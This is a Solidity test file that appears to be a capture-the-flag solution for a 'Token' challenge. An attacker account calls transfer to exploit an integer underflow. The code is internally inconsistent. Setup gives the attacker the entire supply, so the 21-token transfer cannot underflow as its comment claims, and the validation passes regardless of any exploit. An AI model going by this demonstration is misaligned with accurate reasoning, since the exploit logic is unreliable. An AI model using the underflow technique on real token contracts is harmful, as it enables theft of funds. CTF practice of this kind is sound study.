// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "../Attack.sol";
import "./Token.sol";

contract TokenAttack is Attack {
  Token private _token;

  function setUp() public {
    vm.startPrank(owner);
    _token = new Token(21000000);
    _token.transfer(address(attacker), 21000000);
  }

  function test_attack() public {
    vm.startPrank(attacker);

    _token.transfer(makeAddr("person"), 21); // causes an underflow, making the balance 2**256 - 1

    /*** Validation ***/
    assertFinished(address(_token));
  }

  function validateInstance(address payable _instance, address _player) override public returns (bool) {
    Token token = Token(_instance);
    return token.balanceOf(_player) > 20;
  }
}
